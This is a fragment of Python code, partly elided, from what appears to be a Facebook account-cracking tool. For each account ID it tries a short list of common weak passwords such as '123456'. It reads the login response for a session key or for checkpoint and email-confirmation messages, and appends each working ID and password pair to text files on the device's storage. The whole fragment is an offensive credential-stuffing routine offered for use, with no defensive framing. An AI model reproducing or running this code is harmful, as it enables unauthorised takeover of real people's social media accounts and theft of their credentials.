    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","123123"]:
            ...
            if "session_key" in rp:
                ...
                open("/sdcard/𝐒𝐇𝐈𝐘𝐀𝐌-𝐅𝐔𝐂𝐊 𝐘𝐎𝐔𝐑 𝐆𝐅.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r [𝐒𝐇𝐈𝐘𝐀𝐌] {uid} • {pw}")
                open("/sdcard/SHIYAM-𝐃𝐀𝐓𝐀 𝐖𝐈𝐅𝐈 𝐖𝐎𝐑𝐊.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r [EHC-EMRAN] {uid} • {pw}")
                open("/sdcard/SHIYAM-𝐅𝐔𝐂𝐊 𝐘𝐎𝐔𝐑 𝐆𝐅.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
